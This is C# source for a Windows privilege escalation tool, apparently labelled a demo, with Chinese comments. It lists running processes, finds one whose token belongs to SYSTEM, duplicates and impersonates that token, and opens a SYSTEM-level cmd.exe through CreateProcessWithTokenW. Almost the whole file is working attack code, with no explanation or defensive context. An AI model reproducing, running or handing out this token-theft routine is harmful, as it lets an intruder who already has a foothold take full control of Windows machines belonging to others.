using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;

namespace TokenDemo
{
    class Program
    {
        [DllImport("kernel32.dll")]
        public static extern IntPtr OpenProcess(UInt32 dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("advapi32.dll")]
        public static extern bool OpenProcessToken(
            IntPtr ProcessHandle,
            UInt32 DesiredAccess,
            out IntPtr TokenHandle);

        [DllImport("advapi32.dll", CharSet = CharSet.Auto)]
        public extern static bool DuplicateTokenEx(
            IntPtr hExistingToken,
            uint dwDesiredAccess,
            ref SECURITY_ATTRIBUTES lpTokenAttributes,
            SECURITY_IMPERSONATION_LEVEL ImpersonationLevel,
            TOKEN_TYPE TokenType,
            out IntPtr phNewToken);

        [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern Boolean CreateProcessWithTokenW(IntPtr hToken, CREATE_FLAGS dwLogonFlags, String lpApplicationName, String lpCommandLine, CREATION_FLAGS dwCreationFlags, IntPtr lpEnvironment, IntPtr lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInfo);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern Boolean CreateProcessAsUserW(IntPtr hToken, string lpApplicationName, IntPtr lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, Boolean bInheritHandles, CREATION_FLAGS dwCreationFlags, IntPtr lpEnvironment, IntPtr lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInfo);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern Boolean CloseHandle(IntPtr hProcess);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern Boolean CloseHandle(STARTUPINFO hProcess); 

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern Boolean CloseHandle(PROCESS_INFORMATION hProcess);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern Boolean GetTokenInformation(IntPtr TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, ref TOKEN_STATISTICS TokenInformation, UInt32 TokenInformationLength, out UInt32 ReturnLength);

        [DllImport("secur32.dll")]
        public static extern UInt32 LsaGetLogonSessionData(IntPtr LogonId,out IntPtr ppLogonSessionData);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern Boolean ImpersonateLoggedOnUser(IntPtr hToken);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        public static extern bool LookupAccountSid(
            String lpSystemName,
            IntPtr Sid,
            StringBuilder lpName,
            ref UInt32 cchName,
            StringBuilder ReferencedDomainName,
            ref UInt32 cchReferencedDomainName,
            out SID_NAME_USE peUse);

        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern UInt32 NtFilterToken(
            IntPtr TokenHandle,
            UInt32 Flags,
            IntPtr SidsToDisable,
            IntPtr PrivilegesToDelete,
            IntPtr RestrictedSids,
            ref IntPtr hToken
        );

        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern int NtSetInformationToken(
            IntPtr TokenHandle,
            TOKEN_INFORMATION_CLASS TokenInformationClass,
            ref TOKEN_MANDATORY_LABEL TokenInformation,
            UInt32 TokenInformationLength);

        [DllImport("advapi32.dll")]
        public static extern bool AllocateAndInitializeSid(
            ref SID_IDENTIFIER_AUTHORITY pIdentifierAuthority,
            byte nSubAuthorityCount,
            int dwSubAuthority0, int dwSubAuthority1,
            int dwSubAuthority2, int dwSubAuthority3,
            int dwSubAuthority4, int dwSubAuthority5,
            int dwSubAuthority6, int dwSubAuthority7,
            ref IntPtr pSid);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern Boolean SetTokenInformation(
            IntPtr TokenHandle,
            TOKEN_INFORMATION_CLASS TokenInformationClass,
            ref TOKEN_MANDATORY_LABEL TokenInformation,
            UInt32 TokenInformationLength
        );

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern Boolean CreateRestrictedToken(
          IntPtr ExistingTokenHandle,
          UInt32 Flags,
          UInt32 DisableSidCount,
          IntPtr SidsToDisable,
          UInt32 DeletePrivilegeCount,
          IntPtr PrivilegesToDelete,
          UInt32 RestrictedSidCount,
          IntPtr SidsToRestrict,
          out IntPtr NewTokenHandle
        );

        static void Main(string[] args)
        {
            Program program = new Program();
            program.GetSystem();
            Console.WriteLine("全部检索完毕!");
            Console.ReadKey();
        }

        public void GetSystem() {
            EnumerateUserProcesses();
        }

        public static Boolean token_elevation(IntPtr hExistingToken) {
            IntPtr phNewToken;
            STARTUPINFO StartupInfo = new STARTUPINFO();
            PROCESS_INFORMATION procinfo = new PROCESS_INFORMATION();
            StartupInfo.cb = (UInt32)Marshal.SizeOf(StartupInfo);
            SECURITY_ATTRIBUTES securityAttributes = new SECURITY_ATTRIBUTES();
            if (!DuplicateTokenEx(
                        hExistingToken,
                        Flags.TOKEN_ALL_ACCESS,
                        ref securityAttributes,
                        SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
                        TOKEN_TYPE.TokenPrimary,
                        out phNewToken
            ))
            {
                return false;
            }
            Console.WriteLine("[+] Duplicate The Token!");

            //提升自身进程权限
            if (!ImpersonateLoggedOnUser(phNewToken))
            {
                return false;
            }
            Console.WriteLine("[+] Operating as {0}", System.Security.Principal.WindowsIdentity.GetCurrent().Name);

            //if(CreateProcessAsUserW(phNewToken, "C:\\Windows\\System32\\cmd.exe",IntPtr.Zero, IntPtr.Zero, IntPtr.Zero,true,CREATION_FLAGS.NONE,IntPtr.Zero, IntPtr.Zero, ref StartupInfo, out procinfo))

            if (CreateProcessWithTokenW(phNewToken, CREATE_FLAGS.LOGON_WITH_PROFILE, "C:\\Windows\\System32\\cmd.exe", null, CREATION_FLAGS.CREATE_NEW_CONSOLE, IntPtr.Zero, IntPtr.Zero, ref StartupInfo, out procinfo))
            {
                Console.WriteLine("[+] SUCCESS");
                return true;
            }
            return false;
        }

        public static Boolean EnumerateUserProcesses()
        {
            Boolean rs = false;
            Process[] pids = Process.GetProcesses();
            Console.WriteLine("[*] Examining {0} processes", pids.Length);
            foreach (Process p in pids)
            {
                if (p.ProcessName.ToUpper().Equals("System".ToUpper())) {       //跳过进程名为"System"的进程
                    continue;
                }
                IntPtr hProcess = OpenProcess(Flags.PROCESS_QUERY_INFORMATION, true, p.Id);
                if (IntPtr.Zero == hProcess)
                {
                    hProcess = OpenProcess(Flags.PROCESS_QUERY_LIMITED_INFORMATION, true, p.Id); //required for protected processes
                    if (IntPtr.Zero == hProcess)
                    {
                        continue;
                    }
                }
                IntPtr hToken;
                if (!OpenProcessToken(hProcess, Flags.MAXIMUM_ALLOWED, out hToken))
                {
                    continue;
                }
                CloseHandle(hProcess);

                UInt32 dwLength = 0;
                TOKEN_STATISTICS tokenStatistics = new TOKEN_STATISTICS();
                if (!GetTokenInformation(hToken, TOKEN_INFORMATION_CLASS.TokenStatistics, ref tokenStatistics, dwLength, out dwLength))
                {
                    if (!GetTokenInformation(hToken, TOKEN_INFORMATION_CLASS.TokenStatistics, ref tokenStatistics, dwLength, out dwLength))
                    {
                        continue;
                    }
                }

                String userName = String.Empty;
                if (!GetTokenInformationToUsername(tokenStatistics, ref userName))
                {
                    continue;
                }
				
                rs = token_elevation(hToken);
                if (rs)
                {
                    Console.WriteLine("模拟成功！PID:" + p.Id);
                    break;
                }
            }
            return rs;
        }

        //获取进程的用户是否是SYSTEM
        public static Boolean GetTokenInformationToUsername(TOKEN_STATISTICS tokenStatistics, ref String userName)
        {
            IntPtr lpLuid = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(_LUID)));
            Marshal.StructureToPtr(tokenStatistics.AuthenticationId, lpLuid, false);
            if (IntPtr.Zero == lpLuid)
            {
                return false;
            }

            IntPtr ppLogonSessionData = new IntPtr();
            if (0 != LsaGetLogonSessionData(lpLuid, out ppLogonSessionData))
            {
                return false;
            }

            if (IntPtr.Zero == ppLogonSessionData)
            {
                return false;
            }

            SECURITY_LOGON_SESSION_DATA securityLogonSessionData = (SECURITY_LOGON_SESSION_DATA)Marshal.PtrToStructure(ppLogonSessionData, typeof(SECURITY_LOGON_SESSION_DATA));
            if (IntPtr.Zero == securityLogonSessionData.Sid || IntPtr.Zero == securityLogonSessionData.UserName.Buffer || IntPtr.Zero == securityLogonSessionData.LogonDomain.Buffer)
            {
                return false;
            }
            StringBuilder lpName = new StringBuilder();
            UInt32 cchName = (UInt32)lpName.Capacity;
            StringBuilder lpReferencedDomainName = new StringBuilder();
            UInt32 cchReferencedDomainName = (UInt32)lpReferencedDomainName.Capacity;
            SID_NAME_USE sidNameUse = new SID_NAME_USE();
            LookupAccountSid(String.Empty, securityLogonSessionData.Sid, lpName, ref cchName, lpReferencedDomainName, ref cchReferencedDomainName, out sidNameUse);

            userName = lpName.ToString();
            if (!userName.ToUpper().Equals("System".ToUpper())) {
                return false;
            }
            return true;
        }
    }
}
